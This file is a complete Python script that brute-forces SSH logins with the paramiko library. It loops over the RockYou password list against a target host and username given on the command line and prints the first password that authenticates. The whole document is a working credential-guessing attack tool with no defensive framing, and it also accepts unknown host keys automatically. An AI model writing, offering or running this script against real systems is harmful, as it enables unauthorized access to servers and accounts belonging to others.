import paramiko
import sys

class SSHClient:
    def __init__(self, host, port, username, password):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.client = None

    def connect(self):
        try:
            # Create an instance of the SSHClient class
            self.client = paramiko.SSHClient()
            
            # Configure the missing host key policy to automatically add the server's host key to known_hosts
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Establish an SSH connection using provided credentials
            self.client.connect(self.host, port=self.port, username=self.username, password=self.password)
            
            return True

        except paramiko.AuthenticationException:
            # Return False if authentication fails
            return False
        except Exception as e:
            # Print an error message if an exception occurs during the connection attempt
            print("Error:", e)
            return False

    def close(self):
        if self.client:
            self.client.close()

def main():
    if len(sys.argv) != 4:
        print("Usage: python script.py <SSH server IP> <SSH port> <username>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    target_username = sys.argv[3]
    
    # Load password list from "Rockyou.txt" file
    with open("Rockyou.txt", "r") as file:
        password_list = [line.strip() for line in file]

    # Loop through the password list and attempt SSH login
    ssh_client = SSHClient(target_host, target_port, target_username, "")
    for password in password_list:
        print(f"Trying password: {password}")
        ssh_client.password = password
        if ssh_client.connect():
            print(f"Success! Password found: {password}")
            ssh_client.close()
            break
    else:
        print("Password not found in the list.")

if __name__ == "__main__":
    main()
